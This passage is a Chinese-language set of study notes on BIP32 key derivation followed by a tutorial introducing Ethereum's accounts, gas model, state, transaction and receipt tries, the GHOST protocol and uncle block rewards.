<p>练习（天书般的<a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki">bip32</a>）</p>
<p>The function CKDpriv((kpar, cpar), i) → (ki, ci) computes a child extended private key from the parent extended private key从父扩展私钥计算子扩展私钥:</p>
<p>The function CKDpub((Kpar, cpar), i) → (Ki, ci) computes a child extended public key from the parent extended public key. It is only defined for non-hardened child keys.从父扩展公钥计算子扩展公钥。它只定义为非hardened child</p>
<p>The function N((k, c)) → (K, c) computes the extended public key corresponding to an extended private key (the “neutered” version, as it removes the ability to sign transactions).计算与扩展私钥对应的扩展公钥(“neutered”版本，因为它删除了签署交易的能力)。</p>
<p>The function N((k, c)) → (K, c) computes the extended public key corresponding to an extended private key</p>
<p>To compute the public child key of a parent private key:要计算父私钥的公用子密钥</p>
<ul>
<li>N(CKDpriv((kpar, cpar), i)) (works always).</li>
<li>CKDpub(N(kpar, cpar), i) (works only for non-hardened child keys).仅适用于非硬化子密钥</li>
</ul>
<p>Child key derivation (CKD) ：The function CKDpriv((kpar, cpar), i) → (ki, ci) computes a child extended private key from the parent extended private key，function CKDpub((Kpar, cpar), i) → (Ki, ci) computes a child extended public key from the parent extended public key。</p>
<p>To shorten notation, we will write CKDpriv(CKDpriv(CKDpriv(m,3H),2),5) as m&#x2F;3H&#x2F;2&#x2F;5. Equivalently for public keys, we write CKDpub(CKDpub(CKDpub(M,3),2),5) as M&#x2F;3&#x2F;2&#x2F;5. This results in the following identities:</p>
<ul>
<li>N(m&#x2F;a&#x2F;b&#x2F;c) &#x3D; N(m&#x2F;a&#x2F;b)&#x2F;c &#x3D; N(m&#x2F;a)&#x2F;b&#x2F;c &#x3D; N(m)&#x2F;a&#x2F;b&#x2F;c &#x3D; M&#x2F;a&#x2F;b&#x2F;c.</li>
<li>N(m&#x2F;aH&#x2F;b&#x2F;c) &#x3D; N(m&#x2F;aH&#x2F;b)&#x2F;c &#x3D; N(m&#x2F;aH)&#x2F;b&#x2F;c.</li>
</ul>
<p>However, N(m&#x2F;aH) cannot be rewritten as N(m)&#x2F;aH, as the latter is not possible.</p>
<p>参考：</p>
<ol>
<li><a href="https://link.zhihu.com/?target=https://bitcoinchallenge.codes/">Bitcoin Challenge</a></li>
<li><a href="https://link.zhihu.com/?target=https://bitcoiner.today/en/bitcoin-challenge-310-btc-clues-to-its-resolution-i/">Bitcoin Challenge 310 BTC: Clues to its resolution (I) - bitcoiner today</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.youtube.com/watch?v=Vbzwkl4MlLs">https://www.youtube.com/watch?v=Vbzwkl4MlLs</a></li>
<li><a href="https://link.zhihu.com/?target=http://book.8btc.com/books/6/masterbitcoin2cn/_book/ch05.html">第五章 钱包 · 巴比特图书</a></li>
<li><a href="https://link.zhihu.com/?target=https://bitcoin.org/en/developer-guide%23hierarchical-deterministic-key-creation">Developer Guide - Bitcoin</a></li>
<li><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki">bitcoin&#x2F;bips</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.chainnews.com/articles/145568296316.htm">https://www.chainnews.com/articles/145568296316.htm</a></li>
<li><a href="https://link.zhihu.com/?target=https://aaron67.cc/2019/01/22/bitcoin-wallet/">https://aaron67.cc/2019/01/22/bitcoin-wallet/</a></li>
</ol>
<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><ol>
<li>全账本节点为什么要向spv节点提供merkle路径服务</li>
<li>用户提供这笔输入所在的区块，以及这笔交易在第一几笔交易，用户怎么通过自己的公钥找到这个区块hash？是遍历吗</li>
<li>矿工怎么验证这笔输入有效，逐一遍历吗？</li>
<li></li>
</ol>
<h1 id="区块链技术11-以太坊介绍"><a href="#区块链技术11-以太坊介绍" class="headerlink" title="区块链技术11:以太坊介绍"></a>区块链技术11:以太坊介绍</h1><p>从这一节开始，我们准备介绍两个对比特币的重大变化，以太坊和EOS。</p>
<p>以太坊的概念首次在2013至2014年间由程序员Vitalik Buterin受比特币启发后提出，大意为“下一代加密货币与去中心化应用平台”，在2014年通过ICO众筹开始得以发展。截至2018年2月，以太币是市值第二高的加密货币，仅次于比特币。可以查看参考[<a href="https://link.zhihu.com/?target=https://ethfans.org/wikis/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%8E%86%E5%8F%B2">1]</a>了解以太坊的发展历史。</p>
<p>介绍完之前关于比特币的内容之后，我们应该可以看懂以太坊白皮书前面一部分的内容了。白皮书中对比特币的重要技术和特征作了一个回顾和总结。大家可以自己看看这个<a href="https://link.zhihu.com/?target=https://bitcoin.org/files/bitcoin-paper/bitcoin_zh_cn.pdf">白皮书</a>，确认一下自己之前的学习效果。</p>
<p>那接下来，我们主要讲的是从对比特币的介绍之后的内容，也即白皮书中对比特币脚本语言的限制的描述，通过分析以太坊对比特币的缺陷，我们来理解以太坊的特征。<a href="https://link.zhihu.com/?target=https://ethfans.org/posts/ethereum-whitepaper/">以太坊白皮书</a>。</p>
<p>比特币系统的脚本语言存在一些严重的限制：</p>
<ul>
<li><strong>缺少图灵完备性</strong> – 这就是说，尽管比特币脚本语言可以支持多种计算，但是它不能支持所有的计算。最主要的缺失是循环语句。不支持循环语句的目的是避免交易确认时出现无限循环。理论上，对于脚本程序员来说，这是可以克服的障碍，因为任何循环都可以用多次重复if 语句的方式来模拟，但是这样做会导致脚本空间利用上的低效率，例如，实施一个替代的椭圆曲线签名算法可能将需要256次重复的乘法，而每次都需要单独编码。</li>
<li><strong>价值盲（Value-blindness）</strong>。UTXO脚本不能为账户的取款额度提供精细的的控制。例如，预言机合约（oracle contract）的一个强大应用是对冲合约，A和B各自向对冲合约中发送价值1000美元的比特币，30天以后，脚本向A发送价值1000美元的比特币，向B发送剩余的比特币。虽然实现对冲合约需要一个预言机（oracle）决定一比特币值多少美元，但是与现在完全中心化的解决方案相比，这一机制已经在减少信任和基础设施方面有了巨大的进步。然而，因为UTXO是不可分割的，为实现此合约，唯一的方法是非常低效地采用许多有不同面值的UTXO（例如对应于最大为30的每个k，有一个2^k的UTXO)并使预言机挑出正确的UTXO发送给A和B。</li>
<li><strong>缺少状态</strong> – UTXO只能是已花费或者未花费状态，这就没有给需要任何其它内部状态的多阶段合约或者脚本留出生存空间。这使得实现多阶段期权合约、去中心化的交换要约或者两阶段加密承诺协议（对确保计算奖励非常必要）非常困难。这也意味着UTXO只能用于建立简单的、一次性的合约，而不是例如去中心化组织这样的有着更加复杂的状态的合约，使得元协议难以实现。二元状态与价值盲结合在一起意味着另一个重要的应用-取款限额-是不可能实现的。</li>
<li><strong>区块链盲（Blockchain-blindness）</strong>- UTXO看不到区块链的数据，例如随机数和上一个区块的哈希。这一缺陷剥夺了脚本语言所拥有的基于随机性的潜在价值，严重地限制了博彩等其它领域应用。</li>
</ul>
<p>在白皮书中，引入以太坊的时候，这样介绍：</p>
<p>“以太坊的目的是基于脚本、竞争币和链上元协议（on-chain meta-protocol）概念进行整合和提高，使得开发者能够创建任意的基于共识的、可扩展的、标准化的、特性完备的、易于开发的和协同的应用。……并且因为图灵完备性、价值知晓（value-awareness）、区块链知晓（blockchain-awareness）和多状态所增加的力量而比比特币脚本所能提供的智能合约强大得多。”</p>
<p>既然以太坊社区选择让以太坊拥有如此强大的功能，那么相对应的，他们也必须为此做好准备。我们一条条看一下，为了实现对比特币的改进，以太坊必须添加什么功能。</p>
<p>对比一下以太坊白皮书中列出的比特币和以太坊的状态转换图：</p>
<p>比特币作为状态转移系统</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233062.jpg" alt="img"></p>
<p>以太坊的状态转换：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233063.jpg" alt="img"></p>
<p>在上图中，起始状态保护了四个账户，分别是14c5f8ba、bb75a980、892bf92f、4096ad65。其中14c5f8ba和4096ad65仅维护了余额；bb75a980和892bf92f除了余额之外，还包括一部分的代码和数据。交易数据由14c5f8ba发送到bb75a980，转账10个以太币。同时发送了两个数据2和“charlie”。这个数据传递到账户bb75a980时，触发了bb75a980账户中的代码，意思是如果在对应于交易中携带的数据中的第一个（作为索引），也即tx.data[0]，相对应的位置处的数据是0，则对该位置出的数据进行更新，更新为第二个数据，也即‘charlie’。</p>
<p>所以，这里我们首先需要理解一下以太坊账户的概念。</p>
<p>以太坊的全局“共享状态”是有很多对象（账户）来组成的，这些账户可以通过消息传递架构来与对方进行交互。每个账户都有一个与之关联的状态(state)和一个20字节的地址(address)。在以太坊中一个地址是160位的标识符，用来识别账户的。</p>
<p>有两种类型的账户：</p>
<ol>
<li>外部拥有的账户，被私钥控制且没有任何代码与之关联</li>
<li>合约账户，被它们的合约代码控制且有代码与之关联</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233064.jpg" alt="img"></p>
<h2 id="外部拥有账户（EOA）与合约账户的比较"><a href="#外部拥有账户（EOA）与合约账户的比较" class="headerlink" title="外部拥有账户（EOA）与合约账户的比较"></a>外部拥有账户（EOA）与合约账户的比较</h2><p>理解外部拥有账户和合约账户的基本区别是很重要的。一个外部拥有的账户可以通过创建和用自己的私钥来对交易进行签名，来发送消息给另一个外部拥有账户或合约账户。在两个外部拥有账户之间传送的消息只是一个简单的价值转移。但是从外部拥有的账户到合约账户的消息会激活合约账户的代码，允许它执行各种动作。（比如转移代币，写入内部存储，挖出一个新代币，执行一些运算，创建一个新的合约等等）。</p>
<p>不像外部拥有账户，合约账户不可以自己发起一个交易。相反，合约账户只有在接收到一个交易之后(从一个外部拥有账户或另一个合约账户接)，为了响应此交易而触发一个交易。我们将会在“交易和消息”部分来了解关于合约与合约之间的通信。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233065.jpg" alt="img"></p>
<p>因此，在以太坊上任何的动作，总是被外部控制账户触发的交易所发动的。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233066.jpg" alt="img"></p>
<h3 id="账户状态"><a href="#账户状态" class="headerlink" title="账户状态"></a>账户状态</h3><p>账户状态有四个组成部分，不论账户类型是什么，都存在这四个组成部分：</p>
<ol>
<li>nonce：如果账户是一个外部拥有账户，nonce代表从此账户地址发送的交易序号。如果账户是一个合约账户，nonce代表此账户创建的合约序号</li>
<li>balance： 此地址拥有Wei的数量。1 Ether&#x3D;10^18 Wei</li>
<li>storageRoot： Merkle Patricia树的根节点Hash值。Merkle树会将此账户存储内容的Hash值进行编码，默认是空值</li>
<li>codeHash：此账户EVM（以太坊虚拟机，后面细说）代码的hash值。对于合约账户，就是被Hash的代码并作为codeHash保存。对于外部拥有账户，codeHash域是一个空字符串的Hash值</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233067.jpg" alt="img"></p>
<p>可以简单理解EOA就是实际的用户；而合约账户就是EOA用户部署的合约，外部所有的账户（EOA externally owned account）（由私钥控制的）和合约账户（由合约代码控制）。外部所有的账户没有代码，人们可以通过创建和签名一笔交易从一个外部账户发送消息。每当合约账户收到一条消息，合约内部的代码就会被激活，允许它对内部存储进行读取和写入，和发送其它消息或者创建合约。</p>
<p>##图灵完备性</p>
<p>之前在介绍比特币脚本的时候，我们提到过比特币的脚本是故意设计成不完备的，为什么呢？因为之前分析过，在交易中写的脚本，是需要有矿工来执行并进行确认的。如果是图灵完备的，那么有可能会出现死循环的代码，对于矿工而言是非常不利的。</p>
<p>既然以太坊明确地在挑刺儿，也就意味着在以太坊中实现的脚本语言是图灵完备的。既然这样，以太坊必须要解决的问题是，如何应对死循环可能会无限地消耗？</p>
<p>以太坊中引入了gas（瓦斯、油价等中文翻译）的概念。以太坊在区块链上实现了一个运行环境，被称为以太坊虚拟机（EVM），参与到网络的节点都会运行EVM，验证区块中的每个交易并在EVM中运行交易所触发的代码。合约可以利用的每个命令都会有一个相应的费用值，费用使用gas作为单位计数，也即用户付给矿工的佣金。<a href="https://link.zhihu.com/?target=https://docs.google.com/spreadsheets/d/1m89CVujrQe5LAFJ8-YAUCcNK950dUzMQPMJBxRtGCqs/edit%23gid=0">这里列了一些命令的gas消耗。</a>例：<code>PUSH操作</code>需要消耗<code>3个gas</code>，<code>一次转账</code>一般要消耗<code>21000 gas</code>，gas使用<code>ether</code>（以太币）来支付。</p>
<p>Gas常用的单位是wei，wei和ether的关系如下所示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233068.jpg" alt="img"></p>
<p>每笔交易都被要求包括gas limit（startGas，限制）和Gas Price（价格）。Gas Limit 是用户愿意为执行某个操作或确认交易支付的最大Gas量（最少21,000）。Gas Price 是 Gwei 的数量，用户愿意花费于每个 Gas 单位的价钱。发送者支付的Gas Price越高，则其交易的优先级越重要，因为矿工打包该交易获得的报酬会更高，这样这个交易会较快地被打包到区块中，更早地获得确认。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233069.jpg" alt="img"></p>
<p>如果该交易需要使用的gas数量小于或等于所设置的gas limit，那么这个交易会被成功处理。如果gas总消耗超过gas limit，那么所有的操作都会被复原（回滚），但是交易费仍然会被矿工收取。区块链会显示这笔交易完成尝试，但因为没有提供足够的gas导致所有的合约命令都被复原。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233070.jpg" alt="img"></p>
<p>如果交易里gas没有被消耗完毕，剩下的gas都会以以太币（ether）的形式打回给交易发起者。因为gas消耗一般只是一个大致估算，所以许多用户会超额支付gas来保证他们的交易会被接受。这样如果恶意用户在交易中包括了死循环，那么不论付出多少gas，最终都会消耗完。另外，也正是因为这样的代价问题，虽然以太坊的脚本语言是图灵完备的，也即当前的所有代码都可以在以太坊区块链上运行，但是作为开发者，需要认真考虑代码的效率。两个同样功能的合同，效率高的那个才能生存下来。一个帮助人们理解以太坊合同实际能力的启发问题是：这个功能是否能在一个1999年的智能手机上实现？</p>
<p>总结，当进行每笔交易时，用户设定Gas Limit 和Gas Price，在运行时，矿工首先计算 Gas Limit*Gas Price ，就得到了ETH交易佣金的成本，然后这笔费用首先从用户的账户中扣除，交易运行完毕，如果有剩余，再还给用户。如果不够，矿工也不还钱，只是把交易全部回滚。</p>
<p>发送者支付的Gas Price越高，则其交易的优先级越重要，因为矿工的报酬会更高。 但是，通过设置较低燃料价格（GasPrice），发送者可以节省资金。以太坊客户端的Frontier版本有一个默认的gasPrice，即0.05e12 wei。矿工为了最大化他们的收益，如果大量的交易都是使用默认gasPrice即0.05e12 wei，那么基本上就很难要矿工去接受一个低gasPrice交易，更别说0 gasPrice交易了。</p>
<p>除了计算交易的花费之外，将交易或者合约上传也需要费用。虽然读取本地区块链是免费的，但写入和运算是花钱的。储存更是尤其昂贵，因为任何写入的信息都会被永久的储存着。相比之下，CPU运算很便宜。以太坊是图灵完备的，谁也拦不住你写一个视频解码器然后发布在区块链上；只不过估计你没钱运行它。假设这样的程序的代码至少有几千行，即使把它上传到区块链上也不会便宜。譬如，gas limit&#x3D;2000，假设交易长为170字节，每字节的费用是5，减去850，所以还剩1150，剩下的才是运行交易能使用的gas上限。</p>
<p>除此之外，每个块还有Block gas limit，这个值在创世区块的配置文件中可以指定，譬如查看一个区块的信息如下，也即区块的gas limit是3573388。block gas limit的用意是限制一个区块中能够包含的交易的数量。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233071.jpg" alt="img"></p>
<p><strong>（二）Value-blindness</strong></p>
<p>同样的，来回忆一下，比特币为什么放弃了基于账户的概念，而采取UTXO机制的呢？</p>
<p>使用UTXO可以避免维护账户余额的麻烦。为什么维护余额很麻烦呢？因为为了使用余额，也即能够让矿工检查和验证余额，余额必须是全局可见的数据。而基本上每个交易都会对余额产生影响和带来变化。也即，余额必须要全局可见，能快速地更新，而且可以验证。</p>
<p><strong>【UTXO的优点： 1.较高程度的隐私保护。</strong>如果用户每次交易都使用一个新的地址，那么账户之间的相互关联就很困难。这样做适用于对安全性要求高的货币系统。<strong>2.潜在地可扩展性。</strong> UTXO在理论上可扩展性更好。对于维护交易的Merkle树，即使所有的人(包括数据的拥有者)都遗忘了某一数据，真正受损也只有数据的拥有者，其他人不受影响。 但在以太坊账户系统中，任何人弄丢了一个账户对应在默克尔树中信息，那么将无法处理任何能够影响账户的消息。相当于UTXO是一次性的；而账户是可重用的。】</p>
<p>既然以太坊期望可以有明确的价值，必须能够实现余额的概念。余额相对于UTXO也有一些优点：</p>
<p><strong>【1.节省空间。</strong>如果一个账户有5个UTXO，则从UTXO模式转成账户模式所需空间会从300字节降到30字节。具体计算如下： 300 &#x3D; (20+32+8）* 5 （20是地址字节数，32是TX的id字节数，8是交易金额值字节数）; 30 &#x3D; 20 + 8 + 2 ( 20是地址字节数，8是交易金额值字节数，2是nonce②字节数) 但实际节约并没有这么大，因为账户需要被存储在帕特里夏树中。另外以太坊中交易也比比特币中的更小（以太坊中100字节，比特币中200-250字节），因为每次交易只需要生成一次引用，一次签名，以及一个输出。<strong>2.可替代性更高。</strong> 在UTXO结构中，“有效输出”的源码实现中没有区块链层的概念，所以不管是在技术还是法律上，通过建立一个红名单&#x2F;黑名单，并依据的这些“有效输出”的来源区分它们并不是很实际。<strong>3.简单。</strong> 以太坊编码更简单、更易于理解，尤其是在涉及到复杂脚本时。尽管任何去中心化应用都可以用UTXO方式来实现，但这种方式实质上是通过赋予一个脚本限制给定的UTXO能够使用以及请求的UTXO的种类的方式来实现，包括脚本评估的应用更改根状态的默克尔树证明。因此，UTXO实现方式比以太坊使用账户的方式要复杂的多。<strong>4.轻客户端</strong> 轻客户端可以随时通过沿指定方向扫描状态树来访问与账户相关的所有数据。在UTXO方式中，引用随着每个交易的变化而变化，这对于长时间运行并使用了UTXO根状态传播机制的dapp应用来说，无疑是繁重的。】</p>
<p>账户方式的一个弱点是：为了阻止重播攻击，每笔交易必须有nonce，nonce的值是上一次使用的nonce值+1，这就使得账户需要跟踪nonce的使用情况，并且必须确认交易的Nonce值比上次使用的Nonce值大1。解决这个问题的一个简单方法是让交易包含一个区块号，这样过一段时间之后，交易便不能重放了。</p>
<p>为了实现账户方式，以太坊的做法是采用状态(state)的概念存储一系列账户，每个账户都有自己的余额，以及以太坊特有的数据（代码或内部存储器）。</p>
<p>以太坊的状态由每个交易改变，</p>
<p>为了维护这个状态，和比特币不同，比特币在区块中只包括了交易的merkle树根，而以太坊在区块头部中会包括三棵树，分别是世界状态树（world state trie），交易树（transaction trie）以及receipt树。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233072.jpg" alt="img"></p>
<p>世界状态</p>
<p>世界状态是地址（账户）到账户状态的映射。虽然世界状态不保存在区块链上，但在黄皮书的描述中，世界状态也由树来保存数据（此树也被称为状态数据库或者状态树）。世界状态可以被视作为随着交易的执行而持续更新的全局状态，也是以太坊中唯一的全局的数据。</p>
<p>以太坊中所有的账户信息都体现在世界状态之中，并由世界状态树保存，状态树持续更新。对于以太坊网络中的每一个账户，状态树中存放了一个键值对，其中键key是160位的账户的地址，值value是账户的相关信息，如上面图中所展示的，包括</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">- nonce</span><br><span class="line">- balance</span><br><span class="line">- storageRoot</span><br><span class="line">- codeHash</span><br></pre></td></tr></table></figure>

<p>如果想知道某一账户的余额，或者某智能合约当前的状态，就需要通过查询世界状态树来获取该账户的具体状态信息。其中账户存储树是保存与账户相关联数据的结构。该项只有合约账户才有，而在 EOA 中， storageRoot 留空、 codeHash 则是一串空字符串的哈希值。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233073.jpg" alt="img"></p>
<p>为什么以太坊中需要保存用户状态的历史记录，而比特币中不需要呢？因为，比特币中区块生成速度较慢，产生分叉的可能性也较低。而且，即使产生了分叉，由于比特币系统中的交易比较简单，只是简单的转账交易，因此回滚起来比较方便。比较容易实现将被抛弃的分叉中的交易进行回滚。而以太坊就不一样了。以太坊的区块生成速度比较快，十几秒就会产生一个区块，因此产生分叉非常频繁，需要经常进行回滚操作。最重要的一点是，以太坊中有智能合约，使得以太坊是图灵完备的，可以实现很复杂的交易。因此，如果不保存历史记录，就很难进行回滚操作。</p>
<p>交易树</p>
<p>每当发布一个区块时，区块中包含的所有交易，会被组织成一棵交易树，该树是一棵Merkle Patricia Tree，查找的键值是交易在发布时的序号（交易的排列顺序是由发布区块的节点决定的）。<br>交易树用来证明某笔交易在某个区块当中。交易树中包括的交易的细节：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">nonce,</span><br><span class="line">gas price,</span><br><span class="line">gas limit,</span><br><span class="line">recipient,</span><br><span class="line">transfer value,</span><br><span class="line">transaction signature values, and</span><br><span class="line">account initialization (if transaction is of contract creation type), or transaction data (if transaction is a message call)</span><br></pre></td></tr></table></figure>

<p>收据树</p>
<p>每个交易执行完之后，会形成一个收据，记录交易的相关信息，而这些收据会被组织成一棵收据树，该树是一棵Merkle Patricia Tree，查找的键值是交易在发布时的序号（交易的排列顺序是由发布区块的节点决定的）。收据树中对应的交易的信息：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">post-transaction state,</span><br><span class="line">the cumulative gas used,</span><br><span class="line">the set of logs created through execution of the transaction, and</span><br><span class="line">the Bloom filter composed from information in those logs</span><br></pre></td></tr></table></figure>


<p>那么，既然已经有了交易树，为什么还需要收据树这个数据结构呢？<br>因为，以太坊拥有智能合约，而智能合约的执行过程比较复杂，通过增加收据树，有利于系统快速查询执行的结果。<br>在以太坊中，每个交易对应的收据中都会包含一个Bloom filter，记录这个交易的类型、地址等信息。发布的区块的块头中也有一个总的Bloom filter，这个Bloom filter是所有收据中的Bloom filter的并集。<br>如果我们需要查找过去一段时间内发生的和某个智能合约相关的所有交易，首先需要在区块的块头中的Bloom filter中看看有没有我们要查找的交易的类型，如果有的话，再到区块中的每个交易对应的收据的Bloom filter中进行查找；而如果没有的话，那么该区块中一定没有我们要查找的交易类型。通过该种方法，就可以快速排除掉无关的收据，从而提高查找速度。</p>
<p>（三）状态</p>
<p>（四）区块链盲</p>
<p>在脚本图灵完备以及维护了状态树的情况下，以上两个特征实现起来就容易了。</p>
<p>GHOST协议</p>
<p>GHOST（Greedy Heaviest Observed Subtree）是一种主链（非侧链）选择协议。举例来说：经典的Proof-of-Work（POW）是以取最长的主链为基本原则，GHOST协议则是以包含块数最多为基本原则。</p>
<p>在比特币协议中，最长的链被认为是绝对的正确。如果一个块不是最长链的一部分，那么它被称为是“孤块”。一个孤立的块也是合法的，但是发现的稍晚，或者是网络传输稍慢，而没有能成为最长的链的一部分。在比特币中，孤块没有意义，随后将被抛弃，发现这个孤块的矿工也拿不到采矿相关的奖励。例如：挖矿节点A是一个矿池占有全网30%的算力，挖矿节点B占有全网算力的10%，节点A会有70%的概率产生废块，节点B有90%的概率产生废块。</p>
<p>以太坊平均10多秒发布一个区块，<strong>更短的出块时间意味着，临时性分叉的几率将大幅提升</strong>。这是因为当矿工A挖出一个新区块后，需要向全网广播，广播的过程需要时间，由于以太坊出块时间短，其他节点可能还没有收到矿工A发布的区块，就已经挖出了同一高度的区块，这就造成了临时分叉。<strong>在以太坊网络中，临时性分叉发生的几率在8%左右。</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233074.png" alt="img"></p>
<p>同时，如果新旧区块之间产生的间隔太短, 在上面的例子中，则节点A会因为规模效应而比B节点更为高效。所以新旧区块的间隔过短会导致单一的矿池主导全网的挖矿过程。而区块中的数据重复验证6次（若干次）立即永久封存地区块中，一旦51%算力攻击一旦发生，double-spend等糟糕问题会出现，恶意的数据容易永久封存于区块中，整个blockchain系统需要足够长的时间来处理和恢复黑客恶意攻击所造成的破坏。</p>
<p>在以太坊中，根据GHOST协议，不认为孤块没有价值，而是会给与发现孤块的矿工以回报。孤块被称为“叔块”(uncle block)，它们可以为主链的安全作出贡献，也同样能获得奖励，这激励了矿工在新发现的块中去引用叔块，减少了孤块的产生。</p>
<p>Ghost协议解决了两个问题：摒弃了单一的最长链原则, 取而代之的是最大子数原则；孤块奖励问题。</p>
<p>如下图所示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233075.jpg" alt="img"></p>
<p>如果单纯的计算最长链原则, 主链应该是 0 -&gt; 1B -&gt; 2D -&gt; 3F -&gt; 3F -&gt; 4C -&gt; 5B.<br>如果采用了GHOST协议, 以前的”废块”也会被考虑到主链的计算量中.每一个节点下含一个子树, 兄弟节点之间子树节点最多的被选为主链. 这样一来 0 -&gt; 1B -&gt; 2C -&gt; 3D -&gt; 4B 成为主链,<br>如果采用GHOST协议, 一个攻击者仅仅提供一个1A到6A的长链并不能被认为是主链。</p>
<p>Ghost协议的优势在于：</p>
<ul>
<li>以太坊十几秒的出块间隔，大大增加了孤块的产生，并且降低了安全性。通过鼓励引用叔块，使引用主链获得更多的安全保证（因为孤块本身也是合法的）</li>
<li>比特币中，采矿中心化(大量的集中矿池)成为一个问题。Ghost协议下，叔块也是能够获得报酬，可以一定程度上缓解这个问题。</li>
</ul>
<p>孤块奖励问题：</p>
<ul>
<li>主链节点获得base reward；</li>
<li>一个节点最多引用两个叔块；</li>
<li>叔块必须是区块的前2层~前7层的祖先的直接子块；</li>
<li>被引用过的叔块不能重复引用；</li>
<li>引用叔块的区块，可以获得挖矿报酬的1&#x2F;32，也就是5<strong>1&#x2F;32&#x3D;0.15625 Ether，最多获得2</strong>0.15625&#x3D;0.3125 Ether；</li>
<li>主链节点的兄弟（非主链节点）获得 ((叔块高度+8-当前块的高度)&#x2F;8 )*base reward，如下图表格所示；</li>
<li>交易费用(transaction fee)不会分配给叔块</li>
</ul>
<p>我们通过一个例子来介绍上面的规则。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233076.jpg" alt="img"></p>
<p>假设当前区块高度为107（上图中绿色区块），它能有效引用的叔块，只能是区块高度为101～106的区块，换句说<strong>叔块的有效引用区间，最多只能在7代以内。</strong>上图中黄色区块，区块高度为100，就不在107这个区块的有效引用范围。图中红色的区块，因为<strong>不是最长链上区块的直接子块，这种区块不能成为叔区块。</strong></p>
<p>如果在101和106的区块高度，有多个没被引用的叔块，高度为107的区块做多只能引用两个，而且<strong>一个叔块被它引用后，就不能再被其他区块重复引用。</strong></p>
<p>被引用的叔块获得奖励数量，取决与该叔块和引用区块的“远近”关系。<strong>关系越近，叔块得到奖励越多。</strong>而引用叔块的区块，每引用一个区块，都能得到系统出块奖励的1&#x2F;32，最多只能引用两个区块。当前以太坊新区块获得系统奖励为2枚以太币（2ether），如果叔块在间隔一层就被引用，该叔块将获得出块奖励的7&#x2F;8，也就是1.75ether，如果叔块隔了6层才被引用，它获得奖励只有0.5ether，具体如下表。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233077.jpg" alt="img">间隔层数与叔块奖励的关系</p>
<p>看一个真实的块的情况<a href="https://link.zhihu.com/?target=https://etherscan.io/block/4222300">4222300</a></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233078.jpg" alt="img"></p>
<hr>
<p>由于以上特性，以太坊的轻客户端比Bitcoin的轻客户端功能更强。Bitcoin的轻客户端可以证明包含的交易，但是它不能进行涉及当前状态的证明（如数字资产的持有，名称注册，金融合约的状态等）。而以太坊的轻客户端能够轻松地进行并核实以下类型的查询答案：</p>
<ul>
<li>这笔交易被包含在特定的区块中了么？</li>
<li>告诉我这个地址在过去30天中，发出X类型事件的所有实例（例如，一个众筹合约完成了它的目标）</li>
<li>目前我的账户余额是多少？</li>
<li>这个账户是否存在？</li>
<li>假装在这个合约中运行这笔交易，它的输出会是什么？</li>
</ul>
<p>第一种是由交易树（transaction tree）来处理的；第三和第四种则是由状态树（state tree）负责处理，第二种则由收据树（receipt tree）处理。计算前四个查询任务是相当简单的。服务器简单地找到对象，获取Merkle分支，并通过分支来回复轻客户端。第五种查询任务同样也是由状态树处理，但它的计算方式会比较复杂。</p>
<p>这些树使用了一个非常重要的数据结构。默克尔帕特里夏树(Merkle Patricia tree&#x2F;trie)，由Alan Reiner提出设想，并在瑞波协议中得到实现，是以太坊的主要数据结构，用于存储所有账户状态，以及每个区块中的交易和收据数据。MPT是默克尔树和帕特里夏树的结合缩写，结合这两种树创建的结构具有以下属性：</p>
<ol>
<li>每个唯一键值对唯一映射到根的hash值；在MPT中，不可能仅用一个键值对来欺骗成员（除非攻击者有~2^128 的算力）；</li>
<li>增、删、改键值对的时间复杂度是对数级别。</li>
</ol>
<p>MPT为我们提供了一个高效、易更新、且代表整个状态树的“指纹”。</p>
<p>二叉Merkle树对于验证“清单”格式的信息而言，是非常好的数据结构，本质上来讲，它就是一系列前后相连的数据块。对于交易树来说，它们也同样是不错的，因为一旦树已经建立，花多少时间来编辑这棵树并不重要，树一旦建立了，它就会永远存在。</p>
<p>而对状态树来说，情况会更复杂些。以太坊中的状态树基本上包含了一个键值映射，其中的键是地址还有各种值，包括账户的声明、余额、随机数、代码以及每一个账户的存储（其中存储本身就是一颗树）。例如，the Morden testnet 的创始状态如下所示：</p>
